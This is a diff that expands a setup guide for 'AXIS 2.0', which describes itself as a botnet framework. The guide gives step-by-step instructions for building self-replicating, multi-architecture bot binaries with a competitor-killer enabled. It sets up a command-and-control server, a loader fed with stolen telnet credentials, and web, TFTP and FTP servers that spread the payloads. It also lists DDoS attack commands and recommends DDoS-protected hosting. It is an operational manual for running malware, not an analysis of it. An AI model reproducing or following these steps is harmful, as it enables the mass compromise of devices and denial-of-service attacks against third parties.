@@ -1,232 +1,592 @@
 ================================================================================
                     AXIS 2.0 QUICK SETUP GUIDE
-              Minimal/Universal Installation Instructions
+              Complete Installation & Configuration Guide
 ================================================================================
 
-This is a quick reference guide for experienced users.
+This guide covers the complete installation of AXIS 2.0 botnet framework.
+Follow ALL steps in order for a successful deployment.
 
 ================================================================================
-PREREQUISITES
+TABLE OF CONTENTS
+================================================================================
+
+1. Prerequisites & Requirements
+2. Dependency Installation
+3. Database Setup
+4. Configuration
+5. Building All Components
+6. Web Server Setup
+7. Starting Services
+8. Verification & Testing
+9. Docker Setup (Optional)
+10. Systemd Auto-Start (Optional)
+
+================================================================================
+SECTION 1: PREREQUISITES & REQUIREMENTS
 ================================================================================
 
 Minimum Requirements:
-- Linux server (Ubuntu/Debian/CentOS)
-- 1GB RAM minimum (2GB recommended)
-- 10GB disk space
+- Linux server (Ubuntu 20.04+ / Debian 11+ / CentOS 8+)
+- 2GB RAM minimum (4GB recommended for large botnets)
+- 20GB disk space
 - Root access
 - Public IP address
+- Open ports: 80, 3777, 3778, 3779, 9555
+
+Recommended:
+- 4+ CPU cores
+- 8GB RAM
+- 50GB SSD
+- 1Gbps network connection
+- DDoS-protected hosting
 
 ================================================================================
-ONE-LINER DEPENDENCY INSTALL (Ubuntu/Debian)
+SECTION 2: DEPENDENCY INSTALLATION
 ================================================================================
 
-apt update && apt install -y golang-go mariadb-server apache2 tftpd-hpa vsftpd build-essential screen wget curl gcc-arm-linux-gnueabi gcc-mips-linux-gnu
+Step 2.1: Update System
+-----------------------
+apt update && apt upgrade -y
+reboot
+
+Step 2.2: Install Build Dependencies
+------------------------------------
+apt install -y \
+    golang-go \
+    gcc \
+    g++ \
+    make \
+    build-essential \
+    libmysqlclient-dev \
+    mariadb-server \
+    mariadb-client \
+    apache2 \
+    tftpd-hpa \
+    xinetd \
+    vsftpd \
+    screen \
+    wget \
+    curl \
+    git \
+    net-tools \
+    ufw
+
+Step 2.3: Install Cross-Compilers (for multi-arch bot binaries)
+---------------------------------------------------------------
+apt install -y \
+    gcc-arm-linux-gnueabi \
+    gcc-arm-linux-gnueabihf \
+    gcc-aarch64-linux-gnu \
+    gcc-mips-linux-gnu \
+    gcc-mipsel-linux-gnu \
+    gcc-mips64-linux-gnuabi64 \
+    gcc-powerpc-linux-gnu \
+    gcc-sparc64-linux-gnu \
+    gcc-m68k-linux-gnu \
+    gcc-sh4-linux-gnu \
+    gcc-arc-linux-gnu
+
+Step 2.4: Install Go Dependencies
+---------------------------------
+cd /root/AXIS\ 2.0/cnc
+go mod init production-cnc
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+cd /root/AXIS\ 2.0
 
 ================================================================================
-QUICK DATABASE SETUP
+SECTION 3: DATABASE SETUP
 ================================================================================
 
-mysql -u root -e "CREATE DATABASE AXIS2; CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis123'; GRANT ALL ON AXIS2.* TO 'axis'@'localhost'; FLUSH PRIVILEGES;"
-mysql -u root AXIS2 < database.sql
-mysql -u root AXIS2 -e "UPDATE users SET password='NewPass123!' WHERE username='admin';"
+Step 3.1: Start MariaDB
+-----------------------
+systemctl start mariadb
+systemctl enable mariadb
+
+Step 3.2: Secure Database
+-------------------------
+mysql_secure_installation
+
+Step 3.3: Create Database & User
+--------------------------------
+mysql -u root -p << EOF
+CREATE DATABASE IF NOT EXISTS AXIS2;
+CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis_secure_pass_2024!';
+GRANT ALL PRIVILEGES ON AXIS2.* TO 'axis'@'localhost';
+FLUSH PRIVILEGES;
+EOF
+
+Step 3.4: Import Schema
+-----------------------
+mysql -u root -p < database.sql
+
+Step 3.5: Change Default Admin Password
+---------------------------------------
+mysql -u root -p AXIS2 -e "UPDATE users SET password='YourNewSecurePass123!' WHERE username='admin';"
+mysql -u root -p AXIS2 -e "UPDATE users SET api_key='YOUR_UNIQUE_API_KEY_HERE' WHERE username='admin';"
+
+Step 3.6: Verify Database
+-------------------------
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT * FROM users;"
 
 ================================================================================
-QUICK BUILD
+SECTION 4: CONFIGURATION
 ================================================================================
 
-cd "production source"
+Step 4.1: Get Server IP
+-----------------------
+SERVER_IP=$(curl -s ifconfig.me)
+echo "Your server IP: $SERVER_IP"
+
+Step 4.2: Configure Bot (bot/config.h)
+--------------------------------------
+cd /root/AXIS\ 2.0/bot
+sed -i 's/CNC_ADDR "127.0.0.1"/CNC_ADDR "'$SERVER_IP'"/' config.h
+sed -i 's/HTTP_SERVER_IP "0.0.0.0"/HTTP_SERVER_IP "'$SERVER_IP'"/' config.h
+sed -i 's/HTTP_SERVER "0.0.0.0"/HTTP_SERVER "'$SERVER_IP'"/' config.h
+
+# Enable features (edit config.h)
+#define KILLER      // Enable anti-malware killer
+#define SELFREP     // Enable self-replication scanners
+#define WATCHDOG    // Enable watchdog
+
+Step 4.3: Configure C&C (cnc/main.go)
+-------------------------------------
+cd /root/AXIS\ 2.0/cnc
+# Edit database credentials if different from defaults
+# DatabaseAddr = "127.0.0.1:3306"
+# DatabaseUser = "axis"
+# DatabasePass = "axis_secure_pass_2024!"
+
+Step 4.4: Configure Loader (loader/config.h)
+--------------------------------------------
+cd /root/AXIS\ 2.0/loader
+sed -i 's/0.0.0.0/'$SERVER_IP'/g' config.h
+
+Step 4.5: Configure Downloader (dlr/dlr.h)
+------------------------------------------
+cd /root/AXIS\ 2.0/dlr
+sed -i 's/0.0.0.0/'$SERVER_IP'/g' dlr.h
+
+================================================================================
+SECTION 5: BUILDING ALL COMPONENTS
+================================================================================
+
+Step 5.1: Run Build Script
+--------------------------
+cd /root/AXIS\ 2.0
 chmod +x build.sh
-
-# Install Go deps
-cd cnc && go mod init production-cnc && go get github.com/go-sql-driver/mysql github.com/mattn/go-shellwords && cd ..
-
-# Build
 ./build.sh
 
-================================================================================
-QUICK CONFIGURATION
-================================================================================
+Step 5.2: Verify Build
+----------------------
+ls -la cnc_server scanListen loader
+ls -la bins/
 
-# Replace with your server IP
-SERVER_IP=$(curl -s ifconfig.me)
+Step 5.3: Manual Build (if script fails)
+----------------------------------------
+# Build C&C
+cd cnc
+go build -o ../cnc_server .
 
-# Update configs
-sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h
-sed -i "s/0.0.0.0/$SERVER_IP/g" loader/config.h
-sed -i "s/0.0.0.0/$SERVER_IP/g" dlr/dlr.h
+# Build scanListen
+cd ..
+go build -o scanListen scanListen.go
 
-echo "Server IP configured: $SERVER_IP"
-
-================================================================================
-QUICK START
-================================================================================
-
-# Start services
-screen -S cnc -dm ./cnc_server
-screen -S scan -dm ./scanListen
-
-echo "AXIS 2.0 started!"
-echo "Connect: telnet $SERVER_IP 3778"
-echo "Login: admin / admin123"
-
-================================================================================
-MINIMAL INSTALL (No Cross-Compilation)
-================================================================================
-
-# Build only for current architecture
+# Build Bot (native architecture)
 cd bot
 gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
 strip ../bins/axis.x86_64
 
-# Copy to web dir
-cp ../bins/axis.x86_64 /var/www/html/bins/
+# Build Loader
+cd ../loader
+gcc -std=gnu99 -O3 -o ../loader *.c -lpthread
+strip ../loader
+
+# Build Downloader
+cd ../dlr
+gcc -std=gnu99 -Os -static -o ../bins/dlr.x86_64 main.c
+strip ../bins/dlr.x86_64
 
 ================================================================================
-DOCKER SETUP (Alternative)
+SECTION 6: WEB SERVER SETUP
 ================================================================================
 
-# Create Dockerfile
+Step 6.1: Configure Apache
+--------------------------
+systemctl start apache2
+systemctl enable apache2
+
+# Create bins directory
+mkdir -p /var/www/html/bins
+chmod 777 /var/www/html/bins
+
+# Copy binaries
+cp /root/AXIS\ 2.0/bins/* /var/www/html/bins/
+chmod 644 /var/www/html/bins/*
+
+# Test download
+curl -I http://$SERVER_IP/bins/axis.x86_64
+
+Step 6.2: Configure TFTP Server
+-------------------------------
+mkdir -p /var/lib/tftpboot
+chmod 777 /var/lib/tftpboot
+cp /root/AXIS\ 2.0/bins/* /var/lib/tftpboot/
+
+# Configure xinetd for TFTP
+cat > /etc/xinetd.d/tftp << EOF
+service tftp
+{
+    socket_type     = dgram
+    protocol        = udp
+    wait            = yes
+    user            = root
+    server          = /usr/sbin/in.tftpd
+    server_args     = -s /var/lib/tftpboot
+    disable         = no
+    per_source      = 11
+    cps             = 100 2
+    flags           = IPv4
+}
+EOF
+
+systemctl restart xinetd
+systemctl enable xinetd
+
+Step 6.3: Configure FTP Server (Optional)
+-----------------------------------------
+mkdir -p /var/ftp
+chmod 777 /var/ftp
+cp /root/AXIS\ 2.0/bins/* /var/ftp/
+
+# Configure vsftpd
+cat > /etc/vsftpd.conf << EOF
+listen=YES
+listen_ipv6=NO
+anonymous_enable=YES
+local_enable=NO
+write_enable=NO
+anon_root=/var/ftp
+anon_upload_enable=NO
+anon_mkdir_write_enable=NO
+xferlog_enable=YES
+xferlog_file=/var/log/vsftpd.log
+connect_from_port_20=YES
+pasv_enable=NO
+port_enable=YES
+EOF
+
+systemctl restart vsftpd
+systemctl enable vsftpd
+
+================================================================================
+SECTION 7: STARTING SERVICES
+================================================================================
+
+Step 7.1: Start C&C Server
+--------------------------
+cd /root/AXIS\ 2.0
+screen -S cnc -dm ./cnc_server
+echo "C&C server started on port 3778 (bots) and 3777 (admin TLS)"
+
+Step 7.2: Start Scan Listener
+-----------------------------
+screen -S scan -dm ./scanListen
+echo "Scan listener started on port 9555"
+
+Step 7.3: Start Loader (when ready)
+-----------------------------------
+screen -S loader -dm ./loader
+# Feed IPs via: echo "1.2.3.4:23 user:pass" > list.txt
+# Then: cat list.txt | ./loader
+
+Step 7.4: Verify Services
+-------------------------
+ps aux | grep -E 'cnc_server|scanListen'
+netstat -tulpn | grep -E '3777|3778|3779|9555'
+
+================================================================================
+SECTION 8: VERIFICATION & TESTING
+================================================================================
+
+Step 8.1: Test Admin Panel Connection
+-------------------------------------
+# Using OpenSSL (TLS connection)
+openssl s_client -connect $SERVER_IP:3777 -quiet
+
+# Login with:
+# Username: admin
+# Password: YourNewSecurePass123!
+
+Step 8.2: Test API
+------------------
+curl http://$SERVER_IP:3779/api/botnet/status
+
+Step 8.3: Test Web Server
+-------------------------
+wget http://$SERVER_IP/bins/axis.x86_64
+ls -la axis.x86_64
+
+Step 8.4: Test Database
+-----------------------
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT * FROM users;"
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT * FROM history LIMIT 5;"
+
+Step 8.5: Test Bot Connection (simulate)
+----------------------------------------
+echo -e "\x00\x00\x00\x01\x00" | nc $SERVER_IP 3778
+
+================================================================================
+SECTION 9: DOCKER SETUP (OPTIONAL)
+================================================================================
+
+Step 9.1: Install Docker
+------------------------
+curl -fsSL https://get.docker.com -o get-docker.sh
+sh get-docker.sh
+systemctl enable docker
+systemctl start docker
+
+Step 9.2: Create Dockerfile
+---------------------------
+cd /root/AXIS\ 2.0
 cat > Dockerfile << 'EOF'
-FROM ubuntu:20.04
-RUN apt update && apt install -y golang-go mariadb-server apache2 build-essential screen
-COPY production\ source /root/production\ source
-WORKDIR /root/production\ source
-EXPOSE 3778 3779 9555 80
+FROM ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+RUN apt update && apt install -y \
+    golang-go \
+    gcc \
+    build-essential \
+    mariadb-server \
+    apache2 \
+    screen \
+    wget \
+    curl \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /root/AXIS_2.0
+
+COPY . .
+
+RUN chmod +x build.sh && ./build.sh
+
+EXPOSE 80 3777 3778 3779 9555
+
 CMD ["./cnc_server"]
 EOF
 
-# Build and run
-docker build -t axis2 .
-docker run -d -p 3778:3778 -p 3779:3779 -p 9555:9555 -p 80:80 --name axis2 axis2
+Step 9.3: Build and Run Docker Container
+----------------------------------------
+docker build -t axis2:latest .
+docker run -d \
+    -p 80:80 \
+    -p 3777:3777 \
+    -p 3778:3778 \
+    -p 3779:3779 \
+    -p 9555:9555 \
+    --name axis2 \
+    axis2:latest
 
 ================================================================================
-SYSTEMD SERVICE (Auto-start on boot)
+SECTION 10: SYSTEMD AUTO-START (OPTIONAL)
 ================================================================================
 
-# Create service file
+Step 10.1: Create C&C Service
+-----------------------------
 cat > /etc/systemd/system/axis2-cnc.service << EOF
 [Unit]
 Description=AXIS 2.0 C&C Server
-After=network.target mariadb.service
+After=network.target mariadb.service apache2.service
 
 [Service]
 Type=simple
 User=root
-WorkingDirectory=/root/production\ source
-ExecStart=/root/production\ source/cnc_server
+WorkingDirectory=/root/AXIS\ 2.0
+ExecStart=/root/AXIS\ 2.0/cnc_server
 Restart=always
+RestartSec=10
+LimitNOFILE=999999
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Enable and start
+Step 10.2: Create Scan Listener Service
+---------------------------------------
+cat > /etc/systemd/system/axis2-scan.service << EOF
+[Unit]
+Description=AXIS 2.0 Scan Listener
+After=network.target axis2-cnc.service
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root/AXIS\ 2.0
+ExecStart=/root/AXIS\ 2.0/scanListen
+Restart=always
+RestartSec=10
+LimitNOFILE=999999
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+Step 10.3: Enable and Start Services
+------------------------------------
 systemctl daemon-reload
 systemctl enable axis2-cnc
+systemctl enable axis2-scan
 systemctl start axis2-cnc
+systemctl start axis2-scan
+systemctl status axis2-cnc axis2-scan
 
 ================================================================================
-VERIFY INSTALLATION
+FIREWALL CONFIGURATION
 ================================================================================
 
-# Check services
-ps aux | grep -E 'cnc_server|scanListen'
+# Configure UFW firewall
+ufw default deny incoming
+ufw default allow outgoing
 
-# Check ports
-netstat -tulpn | grep -E '3778|3779|9555'
+# Allow SSH (change port if needed)
+ufw allow 22/tcp
 
-# Test connection
-echo -e "admin\nadmin123\n" | nc localhost 3778
+# Allow C&C ports
+ufw allow 3777/tcp  # Admin TLS
+ufw allow 3778/tcp  # Bot connections
+ufw allow 3779/tcp  # API
+ufw allow 9555/tcp  # Scan results
 
-# Check database
-mysql -u axis -paxis123 AXIS2 -e "SELECT * FROM users;"
+# Allow web services
+ufw allow 80/tcp    # HTTP (binaries)
+ufw allow 69/udp    # TFTP
+
+# Enable firewall
+ufw enable
+ufw status
 
 ================================================================================
 SECURITY CHECKLIST
 ================================================================================
 
-[ ] Change default admin password
-[ ] Change database password
-[ ] Configure firewall (only required ports open)
+[ ] Changed default admin password
+[ ] Changed database password
+[ ] Changed API key
+[ ] Configured firewall (only required ports open)
 [ ] Set up fail2ban for SSH
-[ ] Enable automatic security updates
-[ ] Set up regular backups
-[ ] Configure log rotation
+[ ] Enabled automatic security updates
+[ ] Set up regular database backups
+[ ] Configured log rotation
 [ ] Set up monitoring/alerting
+[ ] Disabled root SSH login
+[ ] Set up SSH key authentication
+[ ] Configured DDoS protection
+[ ] Set up rate limiting
 
 ================================================================================
-COMMON COMMANDS
+COMMON COMMANDS REFERENCE
 ================================================================================
 
-# View running screens
+# Service Management
+systemctl status axis2-cnc axis2-scan
+systemctl restart axis2-cnc
+systemctl stop axis2-scan
+journalctl -u axis2-cnc -f
+
+# Screen Sessions
 screen -ls
-
-# Attach to screen
-screen -r [name]
-
-# Detach from screen
-# Press Ctrl+A, then D
-
-# Kill screen session
+screen -r cnc
+screen -r scan
 screen -S [name] -X quit
 
-# View logs
+# View Logs
 tail -f logs/commands.txt
 tail -f logs/logins.txt
 tail -f telnet.txt
 
-# Database commands
-mysql -u axis -paxis123 AXIS2
+# Database Commands
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2
 > SELECT COUNT(*) FROM users;
 > SELECT * FROM history ORDER BY time_sent DESC LIMIT 10;
+> SELECT * FROM logins ORDER BY timestamp DESC LIMIT 20;
+
+# Bot Management (via admin panel)
+> .status         # Show bot count
+> .bots           # List online bots
+> .restart        # Restart all bots
+
+# Attack Commands (via admin panel)
+> !udp <ip> <port> <duration>
+> !tcp <ip> <port> <duration>
+> !http <url> <duration>
+> !stop           # Stop all attacks
 
 ================================================================================
-FILE LOCATIONS
+FILE LOCATIONS SUMMARY
 ================================================================================
 
-Binaries:      /var/www/html/bins/
-               /var/lib/tftpboot/
-               /var/ftp/
+Source Code:     /root/AXIS 2.0/
+Binaries:        /root/AXIS 2.0/bins/
+                 /var/www/html/bins/
+                 /var/lib/tftpboot/
+                 /var/ftp/
 
-Logs:          logs/commands.txt
-               logs/logins.txt
-               telnet.txt
+Executables:     /root/AXIS 2.0/cnc_server
+                 /root/AXIS 2.0/scanListen
+                 /root/AXIS 2.0/loader
 
-Configs:       cnc/main.go
-               bot/config.h
-               loader/config.h
-               dlr/dlr.h
+Logs:            /root/AXIS 2.0/logs/commands.txt
+                 /root/AXIS 2.0/logs/logins.txt
+                 /root/AXIS 2.0/telnet.txt
 
-Database:      AXIS2 (MariaDB/MySQL)
+Configs:         /root/AXIS 2.0/bot/config.h
+                 /root/AXIS 2.0/cnc/main.go
+                 /root/AXIS 2.0/loader/config.h
+                 /root/AXIS 2.0/dlr/dlr.h
 
-================================================================================
-UPDATING
-================================================================================
+Database:        AXIS2 (MariaDB/MySQL)
+                 User: axis
+                 Pass: axis_secure_pass_2024!
 
-# Stop services
-killall cnc_server scanListen loader
-
-# Pull changes (if using git)
-git pull
-
-# Rebuild
-./build.sh
-
-# Restart
-screen -S cnc -dm ./cnc_server
-screen -S scan -dm ./scanListen
+Web Server:      /var/www/html/
+TFTP Server:     /var/lib/tftpboot/
+FTP Server:      /var/ftp/
 
 ================================================================================
-BACKUP
+TROUBLESHOOTING
 ================================================================================
 
-# Backup database
-mysqldump -u axis -paxis123 AXIS2 > axis2_backup_$(date +%Y%m%d).sql
+See TROUBLESHOOTING.txt for detailed troubleshooting guide.
 
-# Backup binaries
-tar -czf bins_backup_$(date +%Y%m%d).tar.gz /var/www/html/bins/
+Quick fixes:
 
-# Backup logs
-tar -czf logs_backup_$(date +%Y%m%d).tar.gz logs/
+# Services not starting
+killall cnc_server scanListen
+./cnc_server &
+./scanListen &
+
+# Database connection issues
+systemctl restart mariadb
+mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT 1;"
+
+# Permission issues
+chmod 777 /var/www/html/bins/
+chmod 777 /var/lib/tftpboot/
+chmod 777 /var/ftp/
+
+# Port conflicts
+netstat -tulpn | grep -E '3777|3778|3779|9555'
+kill -9 $(lsof -t -i:3778)
+
+================================================================================
+END OF QUICK SETUP GUIDE
+================================================================================
+
+For more information, see:
+- README.md - Full documentation
+- TROUBLESHOOTING.txt - Troubleshooting guide
 
 ================================================================================
